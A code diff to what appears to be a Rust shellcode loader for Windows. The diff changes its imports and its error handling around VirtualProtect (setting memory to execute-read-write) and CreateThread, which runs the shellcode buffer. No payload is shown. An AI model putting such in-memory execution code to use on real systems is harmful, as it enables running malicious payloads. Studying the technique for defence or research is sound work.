@@ -1,7 +1,4 @@
-use std::{
-    process::exit,
-    ptr::{copy, null, null_mut},
-};
+use std::ptr::{copy, null, null_mut};
 use windows::Win32::System::Memory::{
     VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
     PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
@@ -53,10 +50,8 @@ fn main() {
             shellcode.len(),
             PAGE_EXECUTE_READWRITE,
             &mut old_protection,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] VirtualProtect Failed With Error: {}", e);
-            exit(-1)
+        ).unwrap_or_else(|e| {
+            panic!("[!] VirtualProtect Failed With Error: {e}");
         });
 
         println!("[+] Thread Being Created");
@@ -67,10 +62,8 @@ fn main() {
             Some(null()),
             THREAD_CREATION_FLAGS(0),
             Some(null_mut()),
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] CreateThread Failed With Error: {}", e);
-            exit(-1)
+        ).unwrap_or_else(|e| {
+            panic!("[!] CreateThread Failed With Error: {e}");
         });
 
         println!("[+] Shellcode Executed!");
